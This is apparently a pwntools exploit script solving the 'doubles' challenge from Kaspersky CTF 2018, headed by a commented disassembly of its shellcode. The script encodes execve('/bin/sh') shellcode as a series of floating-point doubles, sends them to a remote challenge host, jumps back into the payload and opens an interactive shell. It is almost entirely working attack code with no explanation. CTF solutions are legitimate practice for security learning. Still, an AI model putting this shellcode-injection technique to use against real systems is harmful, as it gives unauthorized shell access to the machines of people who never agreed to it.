#   0x7ffff7ff6000:	lea    rdi,[rip+0x19]        # 0x7ffff7ff6020
#   0x7ffff7ff6007:	nop
#   0x7ffff7ff6008:	lea    rbx,[rdi]
#   0x7ffff7ff600b:	lea    rsp,[rdi]
#   0x7ffff7ff600e:	nop
#   0x7ffff7ff600f:	nop
#   0x7ffff7ff6010:	mov    rax,0x3b
#   0x7ffff7ff6017:	nop
#   0x7ffff7ff6018:	syscall 


#!/usr/bin/python

from pwn import *

LOCAL = False

def pwn():
	
  	log.info("doubles - Kaspersky CTF 2018 - mphx2")
	target.recvuntil("n:")
  	target.sendline("6")
	log.info("sending the shellcode in double")
  	target.sendline("-1.28822987504903625016513979455E-231")
	target.sendline("-6.65942622870644058239392389676E-229")
	target.sendline("-1.28823004067605032300636122832E-231")
	target.sendline("-2.43701313326290968120613812093E-275")
	target.sendline("1.08805855771401084070533089734E-306") #/bin/sh%00
	log.info("jumping -0x70 bytes")
 	target.sendline("-1.2436070539331327E206") #\x86\xeb (jmp -0x70)	
	log.info("spawning the shell")
 	target.interactive()

def main():
        global target
        if LOCAL:
                target = process("./doubles")
        else:
                target = remote("doubles.2018.ctf.kaspersky.com", 10001)
        pwn()

if __name__ == "__main__":
    main()
